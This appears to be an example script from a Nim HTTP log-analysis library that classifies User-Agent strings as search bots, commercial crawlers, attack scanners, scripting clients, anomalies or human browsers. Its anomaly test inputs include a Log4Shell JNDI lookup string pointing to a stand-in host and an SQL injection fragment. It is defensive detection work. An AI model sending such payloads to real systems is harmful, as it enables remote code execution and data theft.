# Example: User-Agent Taxonomy & Bot Identification
# Demonstrates Phase 04 / Category B: Verified search engine bots, commercial crawlers,
# offensive scanners, generic HTTP libraries, and User-Agent anomaly detection.
#
# Compile and run with:
#   nim r --path:src examples/user_agent_taxonomy.nim

import std/strutils
import http_logviewer/core/types
import http_logviewer/analyzer/useragents

proc main() =
  echo "=== http_logviewer: User-Agent Taxonomy & Bot Identification (Phase 04 / Category B) ==="
  echo ""

  # 1. Verified Search Engine Bots & Friendly Crawlers (Item 01)
  echo "[1] Verified Search Engine Bots & Friendly Crawlers (Item 01):"
  let searchBots = [
    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
    "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)",
    "Mozilla/5.0 (compatible; DuckDuckBot-Https/1.1; https://duckduckgo.com/duckduckbot)",
    "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)",
    "ia_archiver (+http://www.alexa.com/site/help/webmasters; crawler@alexa.com)",
    "Twitterbot/1.0"
  ]
  for ua in searchBots:
    let classification = classifyUserAgent(ua)
    echo "  [VERIFIED] ", classification.matchedRule.alignLeft(28), " -> Category: ", $classification.category, " (Score: ", classification.suggestedThreatScore, ")"
  echo ""

  # 2. Known Commercial & SEO Crawlers (Item 02)
  echo "[2] Known Commercial & SEO Crawlers (Item 02):"
  let commercialBots = [
    "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)",
    "Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)",
    "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)",
    "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot)",
    "Screaming Frog SEO Spider/19.2",
    "Mozilla/5.0 (compatible; Bytespider; spider-feedback@bytedance.com)"
  ]
  for ua in commercialBots:
    let classification = classifyUserAgent(ua)
    echo "  [COMMERCIAL] ", classification.matchedRule.alignLeft(26), " -> Category: ", $classification.category, " (Score: ", classification.suggestedThreatScore, ")"
  echo ""

  # 3. Known Offensive Scanners & Exploit Tools (Item 03)
  echo "[3] Known Offensive Scanners & Attack Tools (Item 03):"
  let offensiveScanners = [
    "sqlmap/1.7.2#stable (https://sqlmap.org)",
    "Mozilla/5.0 (compatible; Nikto/2.1.6;)",
    "masscan/1.3.2 (https://github.com/robertdavidgraham/masscan)",
    "nuclei - Open-source project (github.com/projectdiscovery/nuclei)",
    "gobuster/3.6",
    "Nmap Scripting Engine (https://nmap.org/book/nse.html)"
  ]
  for ua in offensiveScanners:
    let classification = classifyUserAgent(ua)
    echo "  [HOSTILE] ", classification.matchedRule.alignLeft(29), " -> Category: ", $classification.category, " (Score: ", classification.suggestedThreatScore, ", Flags: ", classification.flags, ")"
  echo ""

  # 4. Generic Programming HTTP Libraries (Item 04)
  echo "[4] Generic HTTP Libraries & Scripting Clients (Item 04):"
  let httpLibraries = [
    "curl/8.4.0",
    "python-requests/2.31.0",
    "Go-http-client/2.0",
    "Wget/1.21.3 (linux-gnu)",
    "aiohttp/3.8.5",
    "PostmanRuntime/7.32.3"
  ]
  for ua in httpLibraries:
    let classification = classifyUserAgent(ua)
    echo "  [SCRIPT]  ", classification.matchedRule.alignLeft(29), " -> Category: ", $classification.category, " (Score: ", classification.suggestedThreatScore, ")"
  echo ""

  # 5. User-Agent Anomaly Detection (Item 05)
  echo "[5] User-Agent Evasion & Anomaly Detection (Item 05):"
  let anomalies = [
    "-",
    "Mozilla",
    "scanner",
    "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
    "${jndi:ldap://evil.com/a}",
    "Mozilla/5.0 ' union select 1,2,3--"
  ]
  for ua in anomalies:
    let classification = classifyUserAgent(ua)
    let displayUa = if ua.len > 44: ua[0..40] & "..." else: ua
    echo "  [ANOMALY] ", displayUa.alignLeft(45), " -> ", classification.matchedRule, " (Score: ", classification.suggestedThreatScore, ", Category: ", $classification.category, ")"
  echo ""

  # 6. Real Human User Browsers (Clean Control Baseline)
  echo "[6] Real Human User Browsers (Clean Baseline):"
  let humanBrowsers = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_3_1) AppleWebKit/605.1.15 Safari/605.1.15",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_3_1 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148"
  ]
  for ua in humanBrowsers:
    let classification = classifyUserAgent(ua)
    let displayUa = if ua.len > 44: ua[0..40] & "..." else: ua
    echo "  [HUMAN]   ", displayUa.alignLeft(45), " -> ", classification.matchedRule, " (Score: ", classification.suggestedThreatScore, ", Category: ", $classification.category, ")"
  echo ""

  echo "=== User-Agent Taxonomy & Identification Completed Successfully ==="

when isMainModule:
  main()
